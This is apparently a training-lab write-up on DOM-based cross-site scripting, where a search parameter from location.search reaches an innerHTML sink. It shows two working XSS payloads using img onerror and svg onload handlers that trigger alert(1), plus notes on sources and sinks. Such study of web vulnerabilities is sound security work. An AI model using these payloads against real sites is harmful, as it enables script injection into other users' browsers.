# Lab: DOM XSS in innerHTML sink using source location.search

## Vulnerability
The `search` parameter from `location.search` is inserted into the page using `innerHTML` without sanitization, allowing JavaScript execution.

## Exploit

### Step 1 — Identify injection point
Entered test string in search:
```
test123
```
Observed it reflected inside a `<div>` using browser DevTools.

### Step 2 — Test for XSS
Submitted payload:
```html
<img src=x onerror=alert(1)>
```

Alert popped → XSS confirmed.

### Step 3 — Alternative payload
```html
<svg onload=alert(1)>
```

Also executed successfully.

## Result
Successfully executed JavaScript via DOM-based XSS.

## Key Point
- `location.search` is the **source** (user-controlled input)
- `innerHTML` is the **sink** (interprets HTML/JS)
- `<script>` tags do not execute via `innerHTML`, but event handlers (`onerror`, `onload`) do
- DOM XSS occurs entirely on the client side

## Proof

<img alt="solved" src="1.png" />
<img alt="solved" src="2.png" />
<img alt="solved" src="3.png" />
